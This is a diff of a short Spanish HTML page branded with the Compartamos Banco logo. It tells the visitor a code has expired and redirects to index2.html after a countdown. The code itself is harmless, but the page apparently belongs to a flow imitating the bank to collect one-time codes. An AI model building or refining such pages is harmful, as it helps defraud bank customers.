@@ -1,28 +1,31 @@
+
 <!DOCTYPE html>
+
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Código vencido</title>
-    <link rel="stylesheet" href="style.css">
-    <script>
-        let seconds = 4;
-        function updateCountdown() {
-            document.getElementById("countdown").textContent = seconds;
-            if (seconds > 0) {
-                seconds--;
-                setTimeout(updateCountdown, 1000);
-            } else {
-                window.location.href = "index2.html";
-            }
-        }
-        window.onload = updateCountdown;
-    </script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Código vencido</title>
+<link href="style.css" rel="stylesheet"/>
+<script>
+    let seconds = 4;
+    function countdown() {
+      const el = document.getElementById('contador');
+      el.textContent = seconds + ' segundos...';
+      if (seconds <= 0) {
+        window.location.href = 'index2.html';
+      } else {
+        seconds--;
+        setTimeout(countdown, 1000);
+      }
+    }
+    window.onload = countdown;
+  </script>
 </head>
 <body>
-    <div class="container">
-        <img src="Compartamos-Ba-768x163.jpg" alt="Logo Compartamos Banco" style="max-width: 100%; margin-bottom: 20px;">
-        <h1>Código vencido</h1>
-        <p>Estamos generando un nuevo código... regresando en <strong id="countdown">4</strong> segundos</p>
-    </div>
+<img alt="Logo" class="logo" src="Compartamos-Ba-768x163.jpg"/>
+<h2 style="text-align: center;">Código vencido</h2>
+<p style="text-align: center;">Estamos enviando un nuevo código...</p>
+<p id="contador" style="text-align: center;">10 segundos...</p>
 </body>
 </html>
